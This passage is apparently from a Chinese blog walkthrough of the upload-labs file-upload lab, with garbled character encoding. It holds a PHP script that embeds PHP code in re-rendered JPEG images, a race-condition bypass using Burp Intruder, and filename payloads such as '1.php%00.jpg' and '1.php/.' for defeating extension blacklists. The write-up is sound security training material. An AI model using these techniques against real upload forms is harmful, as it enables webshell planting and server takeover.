class="hljs-variable">$nullbytePayloadSize</span>).<br>                                <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$outStream</span>, <span class="hljs-variable">$startPos</span>, <span class="hljs-variable">$imageStreamSize</span>),<br>                            <span class="hljs-number">0</span>,<br>                            <span class="hljs-variable">$nullbytePayloadSize</span>+<span class="hljs-variable">$imageStreamSize</span>-<span class="hljs-variable">$extraBytes</span>) . <br>                                <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$outStream</span>, <span class="hljs-variable">$stopPos</span>);<br>                &#125; <span class="hljs-keyword">elseif</span>(<span class="hljs-variable">$correctImage</span>) &#123;<br>                    <span class="hljs-variable">$outStream</span> = <span class="hljs-variable">$outStreamTmp</span>;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>                <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">checkImage</span>(<span class="hljs-string">&#x27;payload_&#x27;</span>.<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>], <span class="hljs-variable">$outStream</span>)) &#123;<br>                    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Success!&#x27;</span>);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&#x27;payload_&#x27;</span>.<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>]);<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Something\&#x27;s wrong&#x27;</span>);<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkImage</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span>, <span class="hljs-variable">$data</span>, <span class="hljs-variable">$unlink</span> = <span class="hljs-literal">FALSE</span></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$correctImage</span>;<br>        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-variable">$data</span>);<br>        <span class="hljs-variable">$correctImage</span> = <span class="hljs-literal">TRUE</span>;<br>        <span class="hljs-title function_ invoke__">imagecreatefromjpeg</span>(<span class="hljs-variable">$filename</span>);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$unlink</span>)<br>            <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$filename</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$correctImage</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">custom_error_handler</span>(<span class="hljs-params"><span class="hljs-variable">$errno</span>, <span class="hljs-variable">$errstr</span>, <span class="hljs-variable">$errfile</span>, <span class="hljs-variable">$errline</span></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$extraBytes</span>, <span class="hljs-variable">$correctImage</span>;<br>        <span class="hljs-variable">$correctImage</span> = <span class="hljs-literal">FALSE</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/(\d+) extraneous bytes before marker/&#x27;</span>, <span class="hljs-variable">$errstr</span>, <span class="hljs-variable">$m</span>)) &#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$m</span>[<span class="hljs-number">1</span>])) &#123;<br>                <span class="hljs-variable">$extraBytes</span> = (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$m</span>[<span class="hljs-number">1</span>];<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DataInputStream</span> </span>&#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$binData</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$order</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$size</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span>, <span class="hljs-variable">$order</span> = <span class="hljs-literal">false</span>, <span class="hljs-variable">$fromString</span> = <span class="hljs-literal">false</span></span>) </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;binData = <span class="hljs-string">&#x27;&#x27;</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;order = <span class="hljs-variable">$order</span>;<br>            <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$fromString</span>) &#123;<br>                <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$filename</span>) || !<span class="hljs-title function_ invoke__">is_file</span>(<span class="hljs-variable">$filename</span>))<br>                    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;File not exists [&#x27;</span>.<span class="hljs-variable">$filename</span>.<span class="hljs-string">&#x27;]&#x27;</span>);<br>                <span class="hljs-variable language_">$this</span>-&gt;binData = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$filename</span>);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable language_">$this</span>-&gt;binData = <span class="hljs-variable">$filename</span>;<br>            &#125;<br>            <span class="hljs-variable language_">$this</span>-&gt;size = <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$this</span>-&gt;binData);<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">seek</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">return</span> (<span class="hljs-variable language_">$this</span>-&gt;size - <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$this</span>-&gt;binData));<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">skip</span>(<span class="hljs-params"><span class="hljs-variable">$skip</span></span>) </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;binData = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$this</span>-&gt;binData, <span class="hljs-variable">$skip</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">readByte</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">eof</span>()) &#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;End Of File&#x27;</span>);<br>            &#125;<br>            <span class="hljs-variable">$byte</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$this</span>-&gt;binData, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>);<br>            <span class="hljs-variable language_">$this</span>-&gt;binData = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$this</span>-&gt;binData, <span class="hljs-number">1</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$byte</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">readShort</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$this</span>-&gt;binData) &lt; <span class="hljs-number">2</span>) &#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;End Of File&#x27;</span>);<br>            &#125;<br>            <span class="hljs-variable">$short</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$this</span>-&gt;binData, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>);<br>            <span class="hljs-variable language_">$this</span>-&gt;binData = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$this</span>-&gt;binData, <span class="hljs-number">2</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;order) &#123;<br>                <span class="hljs-variable">$short</span> = (<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$short</span>[<span class="hljs-number">1</span>]) &lt;&lt; <span class="hljs-number">8</span>) + <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$short</span>[<span class="hljs-number">0</span>]);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$short</span> = (<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$short</span>[<span class="hljs-number">0</span>]) &lt;&lt; <span class="hljs-number">8</span>) + <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$short</span>[<span class="hljs-number">1</span>]);<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$short</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">eof</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">return</span> !<span class="hljs-variable language_">$this</span>-&gt;binData||(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$this</span>-&gt;binData) === <span class="hljs-number">0</span>);<br>        &#125;<br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="ä½¿ç”¨æ–¹æ³•"><a href="#ä½¿ç”¨æ–¹æ³•" class="headerlink" title="ä½¿ç”¨æ–¹æ³•"></a>ä½¿ç”¨æ–¹æ³•</h3><p>éšä¾¿æ‰¾ä¸€ä¸ªjpgå›¾ç‰‡ï¼Œå…ˆä¸Šä¼ è‡³æœåŠ¡å™¨ç„¶åå†ä¸‹è½½åˆ°æœ¬åœ°ä¿å­˜ä¸º<code>1.jpg</code></p><h3 id="æ’å…¥phpä»£ç "><a href="#æ’å…¥phpä»£ç " class="headerlink" title="æ’å…¥phpä»£ç "></a>æ’å…¥phpä»£ç </h3><p>ä½¿ç”¨è„šæœ¬å¤„ç†<code>1.jpg</code>ï¼Œå‘½ä»¤<code>php jpg_payload.php 1.jpg</code></p><p><img src="https://s2.ax1x.com/2020/02/09/1WO7OU.png" alt="1WO7OU.png"></p><p>ä½¿ç”¨16è¿›åˆ¶ç¼–è¾‘å™¨æ‰“å¼€ï¼Œå°±å¯ä»¥çœ‹åˆ°æ’å…¥çš„phpä»£ç ã€‚</p><p><img src="https://s2.ax1x.com/2020/02/09/1WOjYR.png" alt="1WOjYR.png"></p><h3 id="ä¸Šä¼ å›¾ç‰‡é©¬"><a href="#ä¸Šä¼ å›¾ç‰‡é©¬" class="headerlink" title="ä¸Šä¼ å›¾ç‰‡é©¬"></a>ä¸Šä¼ å›¾ç‰‡é©¬</h3><p>ä¸Šä¼ ä¸Šå»å¹¶éªŒè¯</p><h3 id="éªŒè¯"><a href="#éªŒè¯" class="headerlink" title="éªŒè¯"></a>éªŒè¯</h3><p>å°†ä¸Šä¼ çš„å›¾ç‰‡å†æ¬¡ä¸‹è½½åˆ°æœ¬åœ°,ä½¿ç”¨16è¿›åˆ¶ç¼–è¾‘å™¨æ‰“å¼€</p><p><img src="https://s2.ax1x.com/2020/02/09/1WOvf1.png" alt="1WOvf1.png"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œphpä»£ç æ²¡æœ‰è¢«å»é™¤ã€‚<br>è¯æ˜æˆ‘ä»¬æˆåŠŸä¸Šä¼ äº†å«æœ‰phpä»£ç çš„å›¾ç‰‡ã€‚</p><p>éœ€è¦æ³¨æ„çš„æ˜¯,æœ‰ä¸€äº›jpgå›¾ç‰‡ä¸èƒ½è¢«å¤„ç†ï¼Œæ‰€ä»¥è¦å¤šå°è¯•ä¸€äº›jpgå›¾ç‰‡ã€‚</p><p>ç®€å•æ€»ç»“å°±æ˜¯:</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">å…ˆå°†ä¸€å¼ æ­£å¸¸çš„jpgå›¾ç‰‡ä¸Šä¼ ï¼Œä¸Šä¼ åå°†æœåŠ¡å™¨å­˜å‚¨çš„äºŒæ¬¡æ¸²æŸ“çš„å›¾ç‰‡ä¿å­˜ä¸‹æ¥ã€‚å°†ä¿å­˜ä¸‹æ¥ç»è¿‡æœåŠ¡å™¨äºŒæ¬¡æ¸²æŸ“çš„é‚£å¼ jpgå›¾ç‰‡ï¼Œç”¨æ­¤è„šæœ¬è¿›è¡Œå¤„ç†ç”Ÿæˆpayload.jpgï¼Œç„¶åå†ä¸Šä¼ payload.jpg<br></code></pre></td></tr></table></figure><h1 id="æ¡ä»¶ç«äº‰"><a href="#æ¡ä»¶ç«äº‰" class="headerlink" title="æ¡ä»¶ç«äº‰"></a>æ¡ä»¶ç«äº‰</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$ext_arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>,<span class="hljs-string">&#x27;gif&#x27;</span>);<br>    <span class="hljs-variable">$file_name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br>    <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>    <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$file_name</span>,<span class="hljs-title function_ invoke__">strrpos</span>(<span class="hljs-variable">$file_name</span>,<span class="hljs-string">&quot;.&quot;</span>)+<span class="hljs-number">1</span>);<br>    <span class="hljs-variable">$upload_file</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$file_name</span>;<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$upload_file</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>,<span class="hljs-variable">$ext_arr</span>))&#123;<br>             <span class="hljs-variable">$img_path</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;/&#x27;</span>. <span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">10</span>, <span class="hljs-number">99</span>).<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$file_ext</span>;<br>             <span class="hljs-title function_ invoke__">rename</span>(<span class="hljs-variable">$upload_file</span>, <span class="hljs-variable">$img_path</span>);<br>             <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼&quot;</span>;<br>            <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$upload_file</span>);<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å…ˆmove_uploaded_fileå‡½æ•°å°†ä¸Šä¼ æ–‡ä»¶ä¸´æ—¶ä¿å­˜ï¼Œå†è¿›è¡Œåˆ¤æ–­ï¼Œå¦‚æœä¸åœ¨ç™½åå•é‡Œåˆ™unlinkåˆ é™¤ï¼Œåœ¨çš„è¯å°±renameé‡å‘½åï¼Œæ‰€ä»¥å­˜åœ¨æ¡ä»¶ç«äº‰ã€‚</p><p><strong>ç»•è¿‡æ–¹æ³•</strong></p><p>ç”¨burpå¼€å¯ä¸¤ä¸ªintruderæ¨¡å—ï¼Œä¸€ä¸ªç”¨äºé‡å¤ä¸Šä¼ ï¼Œå¦ä¸€ä¸ªç”¨äºé‡å¤è®¿é—®ã€‚</p><ol><li><p>å…ˆè®¾ç½®ä¸Šä¼ è¯·æ±‚,è®°ä½æ­¤å¤„çš„æ–‡ä»¶åï¼Œç­‰ä¸‹è¦ç”¨æ¥æ‹¼æ¥è®¿é—®è¯·æ±‚çš„url</p><p><img src="https://s2.ax1x.com/2020/02/09/1WXrN9.png" alt="1WXrN9.png"></p></li><li><p>æ­¤å¤„æ²¡æœ‰ä»€ä¹ˆå‚æ•°éœ€è¦çˆ†ç ´ï¼Œåªæ˜¯éœ€è¦é‡å¤å‘èµ·è¯·æ±‚ï¼Œæ‰€ä»¥payloadè®¾ç½®ä¸ºNull payloads,è®¾ç½®è®¿é—®æ¬¡æ•°5000æ¬¡ï¼Œçº¿ç¨‹50ä¸ª</p><p><img src="https://s2.ax1x.com/2020/02/09/1WXc1x.png" alt="1WXc1x.png"></p></li></ol><p>æ¥ä¸‹æ¥è®¾ç½®è®¿é—®è¯·æ±‚</p><ol><li>æµè§ˆå™¨æ„é€ è¯·æ±‚urlï¼š<code>http://127.0.0.1/upload-labs-master/upload/miracle778.php</code>,è¿›è¡Œè®¿é—®ï¼Œç„¶åç”¨burpæŠ“åŒ…</li><li>burpæŠ“åŒ…åå‘é€è‡³intruderæ¨¡å—ï¼Œç„¶åè®¾ç½®payloadï¼Œè¿™ä¸€æ­¥å’Œä¸Šä¼ è¯·æ±‚è®¾ç½®å·®ä¸å¤š,éƒ½æ˜¯Null payloadsã€5000æ¬¡ã€50ä¸ªçº¿ç¨‹</li></ol><p>è®¾ç½®å¥½ä¸¤ä¸ªæ¨¡å—ååŒæ—¶å¯åŠ¨ï¼Œè§‚å¯Ÿç»“æœï¼Œå› ä¸ºæˆ‘ä»¬ä¼ å…¥çš„phpä»£ç æ˜¯<code>phpinfo();</code>,æ‰€ä»¥å¦‚æœè®¿é—®æˆåŠŸçš„è¯ï¼Œä¼šè¿”å›phpçš„é…ç½®ä¿¡æ¯ã€‚</p><p><img src="https://s2.ax1x.com/2020/02/09/1WXgc6.png" alt="1WXgc6.png"></p><p>5000æ¬¡é‡Œæœ‰3æ¬¡è®¿é—®æˆåŠŸï¼Œå‰©ä¸‹çš„è®¿é—®æ¬¡æ•°é‡Œï¼Œæœ‰å°éƒ¨åˆ†æ˜¯çŠ¶æ€ç è¿”å›200ï¼Œä½†æ‰§è¡Œå‡ºé”™</p><p><img src="https://s2.ax1x.com/2020/02/09/1WXshR.png" alt="1WXshR.png"></p><p>å‰©ä¸‹å¤§éƒ¨åˆ†è®¿é—®ç»“æœæ˜¯çŠ¶æ€ç æ˜¯404ã€‚<br>ç”±æ­¤å¯å¾—å‡ºç»“è®ºï¼Œæ¡ä»¶ç«äº‰ç»•è¿‡å­˜åœ¨ä¸€å®šæ¦‚ç‡ï¼Œå®è·µä¸­å¦‚æœä¸€æ¬¡ä¸æˆåŠŸï¼Œå¯ä»¥å¤šè¯•å‡ æ¬¡ã€‚</p><h1 id="x2F-ç»•è¿‡"><a href="#x2F-ç»•è¿‡" class="headerlink" title="&#x2F;. ç»•è¿‡"></a>&#x2F;. ç»•è¿‡</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;php&quot;</span>,<span class="hljs-string">&quot;php5&quot;</span>,<span class="hljs-string">&quot;php4&quot;</span>,<span class="hljs-string">&quot;php3&quot;</span>,<span class="hljs-string">&quot;php2&quot;</span>,<span class="hljs-string">&quot;html&quot;</span>,<span class="hljs-string">&quot;htm&quot;</span>,<span class="hljs-string">&quot;phtml&quot;</span>,<span class="hljs-string">&quot;pht&quot;</span>,<span class="hljs-string">&quot;jsp&quot;</span>,<span class="hljs-string">&quot;jspa&quot;</span>,<span class="hljs-string">&quot;jspx&quot;</span>,<span class="hljs-string">&quot;jsw&quot;</span>,<span class="hljs-string">&quot;jsv&quot;</span>,<span class="hljs-string">&quot;jspf&quot;</span>,<span class="hljs-string">&quot;jtml&quot;</span>,<span class="hljs-string">&quot;asp&quot;</span>,<span class="hljs-string">&quot;aspx&quot;</span>,<span class="hljs-string">&quot;asa&quot;</span>,<span class="hljs-string">&quot;asax&quot;</span>,<span class="hljs-string">&quot;ascx&quot;</span>,<span class="hljs-string">&quot;ashx&quot;</span>,<span class="hljs-string">&quot;asmx&quot;</span>,<span class="hljs-string">&quot;cer&quot;</span>,<span class="hljs-string">&quot;swf&quot;</span>,<span class="hljs-string">&quot;htaccess&quot;</span>);<br><br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;save_name&#x27;</span>];<br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">pathinfo</span>(<span class="hljs-variable">$file_name</span>,PATHINFO_EXTENSION);<br><br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>,<span class="hljs-variable">$deny_ext</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;/&#x27;</span> .<span class="hljs-variable">$file_name</span>;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123; <br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;<br>            &#125;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;ç¦æ­¢ä¿å­˜ä¸ºè¯¥ç±»å‹æ–‡ä»¶ï¼&#x27;</span>;<br>        &#125;<br><br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><a href="https://www.runoob.com/php/func-filesystem-pathinfo.html">pathinfoå‡½æ•°è¯´æ˜</a>ï¼Œä¼šè¾“å‡º <code>dirname</code>ï¼Œ<code>basename</code>ï¼Œ<code>extension</code>ï¼Œè¿™é‡Œ<code>img_path</code>å¯æ§ï¼ˆé€šè¿‡<code>post sava_name</code>ï¼‰ï¼Œæ‰€ä»¥å¯ä»¥åˆ©ç”¨<code>move_uploaded_file</code>çš„<code>\x00</code>æˆªæ–­(<code>save_name=1.php%00.jpg</code>)ç»•è¿‡,ä½†<code>\x00</code>æˆªæ–­ä¹‹å‰å…³å¡å·²ç»å‡ºç°è¿‡äº†ï¼Œè¿™é‡Œæ˜æ˜¾æ˜¯è€ƒå¯Ÿåˆ«çš„çŸ¥è¯†ç‚¹ã€‚å…¶å®è€ƒç‚¹æ˜¯:<code>move_uploaded_file</code>ä¼šå¿½ç•¥æ‰æ–‡ä»¶æœ«å°¾çš„<code>./</code>ï¼Œæ‰€ä»¥å¯ä»¥æ„é€ <code>save_path=1.php/.</code>,è¿™æ ·<code>file_ext</code>å€¼å°±ä¸ºç©ºï¼Œå°±èƒ½ç»•è¿‡é»‘åå•ï¼Œè€Œ<code>move_uploaded_file</code>å‡½æ•°å¿½ç•¥æ–‡ä»¶æœ«å°¾çš„<code>/.</code>å¯ä»¥å®ç°ä¿å­˜æ–‡ä»¶ä¸º<code>.php</code></p><p>ç»•è¿‡æ–¹æ³•</p><ol><li>post: save_name &#x3D; 1.php%00.jpg</li><li>post: save_name &#x3D; 1.php&#x2F;.</li></ol><h1 id="æ•°ç»„-x2F-ç»•è¿‡"><a href="#æ•°ç»„-x2F-ç»•è¿‡" class="headerlink" title="æ•°ç»„ &#x2F;. ç»•è¿‡"></a>æ•°ç»„ &#x2F;. ç»•è¿‡</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>]))&#123;<br>    <span class="hljs-comment">//æ£€æŸ¥MIME</span><br>    <span class="hljs-variable">$allow_type</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;image/jpeg&#x27;</span>,<span class="hljs-string">&#x27;image/png&#x27;</span>,<span class="hljs-string">&#x27;image/gif&#x27;</span>);<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>],<span class="hljs-variable">$allow_type</span>))&#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;ç¦æ­¢ä¸Šä¼ è¯¥ç±»å‹æ–‡ä»¶!&quot;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-comment">//æ£€æŸ¥æ–‡ä»¶å</span><br>        <span class="hljs-variable">$file</span> = <span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;save_name&#x27;</span>]) ? <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>] : <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;save_name&#x27;</span>];<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$file</span>)) &#123;<br>            <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$file</span>));<br>        &#125;<br><br>        <span class="hljs-variable">$ext</span> = <span class="hljs-title function_ invoke__">end</span>(<span class="hljs-variable">$file</span>);<br>        <span class="hljs-variable">$allow_suffix</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>,<span 